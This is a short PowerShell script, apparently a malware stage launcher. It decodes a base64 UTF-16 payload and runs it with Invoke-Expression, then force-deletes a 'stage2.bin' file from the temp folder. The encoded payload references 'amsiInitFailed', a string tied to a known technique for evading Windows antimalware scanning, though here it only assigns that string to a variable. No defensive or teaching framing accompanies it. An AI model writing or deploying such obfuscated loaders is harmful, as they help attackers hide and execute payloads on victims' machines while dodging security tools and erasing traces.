<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.
#>
$EncodedCommand = (
    "JABBAG0AcwBpAE0AYQByAGsAZQByACAAPQAgACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBk" +
    'ACIA'
)
$PayloadText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedCommand))
Write-Verbose ("Decoded stage length: " + $PayloadText.Length)
if ([string]::IsNullOrWhiteSpace($PayloadText)) {
    throw "Decoded stage was empty"
}
Invoke-Expression $PayloadText

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
